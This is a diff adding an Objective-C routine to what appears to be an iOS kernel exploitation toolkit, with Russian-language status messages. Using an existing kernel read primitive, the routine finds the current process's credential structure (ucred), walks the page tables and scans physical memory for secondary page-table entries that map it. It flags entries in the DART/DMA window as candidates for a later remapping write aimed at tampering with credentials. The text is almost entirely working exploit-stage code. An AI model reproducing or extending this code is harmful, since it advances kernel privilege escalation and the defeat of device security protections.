@@ -3371,6 +3371,95 @@ static NSString *kpFmtSptmFn(uint64_t raw)
 
 }
 
++ (NSString *)c3AltPteReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== C3: alt-PTE hunt for ucred (read-only) ===\n"];
+    if (!gPrimitives.kreadbuf) {
+        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        return r;
+    }
+    if (!gFrameTableVA) (void)[self frameTableVAWithLog:r];
+
+    pid_t selfPid = getpid();
+    uint64_t selfProc = proc_self();
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
+    if (!selfProc) { [r appendString:@"FAIL: proc\n"]; return r; }
+
+    uint32_t offProcRo = koffsetof(proc, proc_ro);
+    uint32_t offUcred  = koffsetof(proc_ro, ucred);
+    uint64_t roRaw = 0, ucRaw = 0;
+    if (!kpRead(selfProc + offProcRo, &roRaw, 8, "p_proc_ro", r)) return r;
+    uint64_t ro = kp_untag_ptr(roRaw);
+    if (!kpLooksLikeKernelPointer(ro)) { [r appendString:@"FAIL: proc_ro\n"]; return r; }
+    if (!kpRead(ro + offUcred, &ucRaw, 8, "p_ucred", r)) return r;
+    uint64_t uc = kp_untag_ptr(ucRaw);
+    if (!kpLooksLikeKernelPointer(uc)) { [r appendString:@"FAIL: ucred\n"]; return r; }
+
+    uint64_t ucPage = uc & ~0x3fffULL;
+    uint64_t ucPA = kvtophys(ucPage);
+    uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
+    uint64_t dartLo = pB + 0x40000000ULL;
+    kpNote(r, [NSString stringWithFormat:@"  ucredVA=%#llx PA=%#llx proc=%#llx proc_ro=%#llx",
+              (unsigned long long)ucPage, (unsigned long long)ucPA,
+              (unsigned long long)selfProc, (unsigned long long)ro]);
+    kpNote(r, [NSString stringWithFormat:@"  DART window=[%#llx..%#llx) phys=[%#llx..%#llx)",
+              (unsigned long long)dartLo, (unsigned long long)(pB + pS),
+              (unsigned long long)pB, (unsigned long long)(pB + pS)]);
+
+    // Primary PTE: walk from cpu_ttep for ucPage (kread only).
+    uint64_t ttep = 0;
+    {
+        uint64_t task = 0, map = 0, pmap = 0;
+        if (kpRead(ro + off_proc_ro_pr_task, &task, 8, "pr_task", r))
+            task = kp_untag_ptr(task);
+        if (kpLooksLikeKernelPointer(task) && kpRead(task + off_task_map, &map, 8, "task.map", r))
+            map = kp_untag_ptr(map);
+        if (kpLooksLikeKernelPointer(map) && kpRead(map + koffsetof(vm_map, pmap), &pmap, 8, "pmap", r))
+            pmap = kp_untag_ptr(pmap);
+        if (kpLooksLikeKernelPointer(pmap) && kpRead(pmap + koffsetof(pmap, ttep), &ttep, 8, "ttep", r))
+            ttep = kp_untag_ptr(ttep);
+        kpNote(r, [NSString stringWithFormat:@"  walk root ttep=%#llx",
+                  (unsigned long long)ttep]);
+    }
+
+    uint32_t nAlt = 0, nPT = 0, nHeap = 0, nDart = 0, nHitsDart = 0;
+    if (ucPA) {
+        // Scan only page-table-ish frames (fast enough) + heap for accidental maps.
+        for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
+            int t = kpFrameTypeOf(pa);
+            if (t != 0x15 && t != 0x21 && t != 0x0b) continue;
+            if (t == 0x15) nPT++; else nHeap++;
+            BOOL inDart = (pa >= dartLo);
+            if (inDart) nDart++;
+            // Only look in PTs + heap; prefer DART-side pages for a usable alias.
+            if (t == 0x15 && !inDart && nPT > 4096) continue;
+            uint64_t al = phystokv(pa);
+            if (!al) continue;
+            for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                uint64_t q = early_kread64(al + o);
+                if ((q & 3) != 3) continue;
+                uint64_t oa = q & 0x0000ffffffffc000ULL;
+                if (oa != ucPA) continue;
+                nAlt++;
+                if (inDart) nHitsDart++;
+                kpNote(r, [NSString stringWithFormat:@"  [C3] ★ ALT-PTE tablePA=%#llx off=+%#x type=0x%02x inDART=%d val=%#018llx",
+                          (unsigned long long)pa, o, t, inDart ? 1 : 0, (unsigned long long)q]);
+            }
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  [C3] scannedPT=%u heap=%u dartPages=%u altPTEs=%u altInDART=%u",
+              nPT, nHeap, nDart, nAlt, nHitsDart]);
+    if (nHitsDart)
+        [r appendString:@"[C3] ЕСТЬ alt-PTE в DART-окне — кандидат на OA-remap (write — отдельный заход)\n"];
+    else if (nAlt)
+        [r appendString:@"[C3] alt-PTE есть, но вне DART — DMA-путь слепой\n"];
+    else
+        [r appendString:@"[C3] второго маппинга ucred не найдено\n"];
+    [r appendString:@"\n=== C3 hunt complete (read-only, writes=0) ===\n"];
+    return r;
+}
+
 + (NSString *)ucredHeapSwapReport
 {
     NSMutableString *r = [NSMutableString string];
